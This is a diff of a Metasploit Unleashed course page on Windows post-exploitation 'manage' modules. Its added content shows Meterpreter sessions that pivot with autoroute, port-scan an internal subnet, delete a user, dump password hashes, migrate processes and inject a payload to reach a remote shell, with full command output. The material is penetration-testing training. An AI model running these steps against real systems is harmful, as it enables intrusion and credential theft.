@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Windows Post Manage Modules - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Windows_Post_Manage_Modules" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Windows_Post_Manage_Modules&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Windows_Post_Manage_Modules&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Windows_Post_Manage_Modules&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,302 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Windows Post Manage Modules</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Windows_Post_Manage_Modules#column-one">navigation</a>, <a href="Windows_Post_Manage_Modules#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Windows_Post_Manage_Modules#autoroute"><span class="tocnumber">1</span> <span class="toctext">autoroute</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Windows_Post_Manage_Modules#delete_user"><span class="tocnumber">2</span> <span class="toctext">delete_user</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Windows_Post_Manage_Modules#migrate"><span class="tocnumber">3</span> <span class="toctext">migrate</span></a></li>
+<li class="toclevel-1 tocsection-4"><a href="Windows_Post_Manage_Modules#multi_meterpreter_inject"><span class="tocnumber">4</span> <span class="toctext">multi_meterpreter_inject</span></a></li>
+</ul>
+</td></tr></table>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="autoroute"> autoroute </span></h2>
+<p>The <b>"autoroute"</b> post module creates a new route through a Meterpreter sessions allowing you to pivot deeper into a target network.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run post/windows/manage/autoroute SUBNET=192.168.218.0 ACTION=ADD</span>
+
+<span style='color:#0000FF;'>[*]</span> Running module against V-MAC-XP
+<span style='color:#0000FF;'>[*]</span> Adding a route to 192.168.218.0/255.255.255.0...
+<u>meterpreter</u> > 
+Background session 5? [y/N]  <span style='color:#13C16A;'>y</span></pre>
+<br />
+With our new route added, we can run additional modules through our pivot.
+<br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>ms08_067_netapi</span>) > <span style='color:#13C16A;'>use auxiliary/scanner/portscan/tcp</span> 
+msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.218.0/24</span>
+RHOSTS => 192.168.218.0/24
+msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>set THREADS 50</span>
+THREADS => 50
+msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>set PORTS 445</span>
+PORTS => 445
+msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Scanned 027 of 256 hosts (010% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 052 of 256 hosts (020% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 079 of 256 hosts (030% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 103 of 256 hosts (040% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 128 of 256 hosts (050% complete)
+<span style='color:#0000FF;'>[*]</span> 192.168.218.136:445 - TCP OPEN
+<span style='color:#0000FF;'>[*]</span> Scanned 154 of 256 hosts (060% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 180 of 256 hosts (070% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 210 of 256 hosts (082% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 232 of 256 hosts (090% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 256 of 256 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>tcp</span>) ></pre>
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="delete_user"> delete_user </span></h2>
+<p>The <b>"delete_user"</b> post module deletes a specified user account from the compromised system.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run post/windows/manage/delete_user USERNAME=hacker</span>
+
+<span style='color:#0000FF;'>[*]</span> User was deleted!
+<u>meterpreter</u> ></pre> 
+<br />
+We can them dump the hashes on the system and verify that the user no longer exists on the target.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run post/windows/gather/hashdump</span> 
+
+<span style='color:#0000FF;'>[*]</span> Obtaining the boot key...
+<span style='color:#0000FF;'>[*]</span> Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
+<span style='color:#0000FF;'>[*]</span> Obtaining the user list and keys...
+<span style='color:#0000FF;'>[*]</span> Decrypting user keys...
+<span style='color:#0000FF;'>[*]</span> Dumping password hashes...
+
+
+Administrator:500:7bf4f254b228bb24aad1b435b51404ee:2892d26cdf84d7a70e2fb3b9f05c425e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:2e61920ebe3ed6e6d108113bf6318ee2:5abb944dc0761399b730f300dd474714:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:92e5d2c675bed8d4dc6b74ddd9b4c287:::
+
+
+<u>meterpreter</u> ></pre>
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="migrate"> migrate </span></h2>
+<p>The <b>"migrate"</b> post module will migrate to a specified process or if none is given, will automatically spawn a new process and migrate to it.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run post/windows/manage/migrate</span> 
+
+<span style='color:#0000FF;'>[*]</span> Running module against V-MAC-XP
+<span style='color:#0000FF;'>[*]</span> Current server process: svchost.exe (1092)
+<span style='color:#0000FF;'>[*]</span> Migrating to explorer.exe...
+<span style='color:#0000FF;'>[*]</span> Migrating into process ID 672
+<span style='color:#0000FF;'>[*]</span> New server process: Explorer.EXE (672)
+<u>meterpreter</u> ></pre>
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="multi_meterpreter_inject"> multi_meterpreter_inject </span></h2>
+<p>The <b>"multi_meterpreter_inject"</b> post module will inject a given payload into a process on the compromised host. If no PID value is specified, a new process will be created and the payload injected into it. Although, the name of the module is multi_meterpreter_inject, any payload can be specified.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run post/windows/manage/multi_meterpreter_inject PAYLOAD=windows/shell_bind_tcp</span>
+
+<span style='color:#0000FF;'>[*]</span> Running module against V-MAC-XP
+<span style='color:#0000FF;'>[*]</span> Creating a reverse meterpreter stager: LHOST=192.168.1.101 LPORT=4444
+<span style='color:#00ff00;'>[+]</span> Starting Notepad.exe to house Meterpreter Session.
+<span style='color:#00ff00;'>[+]</span> Process created with pid 3380
+<span style='color:#0000FF;'>[*]</span> Injecting meterpreter into process ID 3380
+<span style='color:#0000FF;'>[*]</span> Allocated memory at address 0x003a0000, for 341 byte stager
+<span style='color:#0000FF;'>[*]</span> Writing the stager into memory...
+<span style='color:#00ff00;'>[+]</span> Successfully injected Meterpreter in to process: 3380
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>^Z</span>
+Background session 5? [y/N] <span style='color:#13C16A;'>y</span> 
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>connect 192.168.1.195 4444</span>
+<span style='color:#0000FF;'>[*]</span> Connected to 192.168.1.195:4444
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32><span style='color:#13C16A;'>ipconfig</span>
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+        Connection-specific DNS Suffix  . : localdomain
+        IP Address. . . . . . . . . . . . : 192.168.1.195
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.1.1
+
+Ethernet adapter Local Area Connection 2:
+
+        Connection-specific DNS Suffix  . : localdomain
+        IP Address. . . . . . . . . . . . : 192.168.218.136
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.218.2
+
+C:\WINDOWS\system32></pre>
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="http://www.offensive-security.com/w/index.php?title=Module_Reference&amp;action=edit&amp;redlink=1" class="new" title="Module Reference (page does not exist)">Module Reference</a> &gt; <a href="http://www.offensive-security.com/w/index.php?title=Post_Modules&amp;action=edit&amp;redlink=1" class="new" title="Post Modules (page does not exist)">Post Modules</a> &gt; <a href="Windows_Post_Modules" title="Windows Post Modules">Windows Post Modules</a> &gt; Windows Post Manage Modules</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 569/1000000
+Preprocessor generated node count: 2745/1000000
+Post‐expand include size: 4586/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:261-0!*!0!!en!*!* and timestamp 20131123195825 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Windows_Post_Manage_Modules&amp;oldid=290">http://www.offensive-security.com/w/index.php?title=Windows_Post_Manage_Modules&amp;oldid=290</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Windows_Post_Modules&amp;action=edit&amp;redlink=1" class="new" title="Category:Windows Post Modules (page does not exist)">Windows Post Modules</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +787,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.126 secs. --></body></html>
